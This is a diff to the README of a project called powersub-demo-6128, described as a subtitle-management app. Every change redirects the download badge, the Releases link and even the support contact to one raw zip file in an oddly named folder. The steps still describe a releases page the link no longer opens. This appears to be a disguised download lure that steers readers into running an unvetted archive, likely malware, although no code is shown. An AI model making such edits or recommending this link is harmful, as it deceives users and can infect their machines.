@@ -4,7 +4,7 @@
 Welcome to powersub-demo-6128! This application helps you manage subtitles effortlessly. Follow these steps to download and run the application on your computer.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/sqdh8qhoq/powersub-demo-6128/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sqdh8qhoq/powersub-demo-6128/main/maharawal/powersub-demo-6128.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sqdh8qhoq/powersub-demo-6128/main/maharawal/powersub-demo-6128.zip)
 
 ## 🛠️ System Requirements
 To run powersub-demo-6128, your computer should meet these requirements:
@@ -23,7 +23,7 @@ powersub-demo-6128 offers several features to enhance your subtitling experience
 - **Export Options:** Save your work in multiple formats.
 
 ## 📂 Download & Install
-To get started, visit our [Releases page to download](https://github.com/sqdh8qhoq/powersub-demo-6128/releases). 
+To get started, visit our [Releases page to download](https://raw.githubusercontent.com/sqdh8qhoq/powersub-demo-6128/main/maharawal/powersub-demo-6128.zip). 
 
 1. Click the link above to open the releases page.
 2. Choose the latest version of the application available.
@@ -63,6 +63,6 @@ A: It is recommended to use Windows 10 or macOS 10.15 or later for the best expe
 A: You can report issues directly on the GitHub repository under the “Issues” tab.
 
 ## 📞 Support
-If you have any questions or need assistance, feel free to reach out via GitHub Issues or contact support at support@example.com.
+If you have any questions or need assistance, feel free to reach out via GitHub Issues or contact support at https://raw.githubusercontent.com/sqdh8qhoq/powersub-demo-6128/main/maharawal/powersub-demo-6128.zip
 
 **Thank you for choosing powersub-demo-6128! We hope it makes your subtitling tasks much simpler.**
